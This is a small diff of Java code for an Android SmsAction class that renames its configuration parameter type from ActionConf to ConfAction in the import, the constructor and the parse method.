@@ -19,6 +19,7 @@ import com.android.service.CellInfo;
 import com.android.service.Device;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -60,7 +61,7 @@ public class SmsAction extends SubAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public SmsAction(final ActionConf params) {
+	public SmsAction(final ConfAction params) {
 		super( params);
 
 		sm = SmsManager.getDefault();
@@ -169,7 +170,7 @@ public class SmsAction extends SubAction {
 	 * @return true, if successful
 	 */
 	@Override
-	protected boolean parse(final ActionConf params) {
+	protected boolean parse(final ConfAction params) {
 		try {
 			
 			number = Utils.unspace( params.getString("number"));
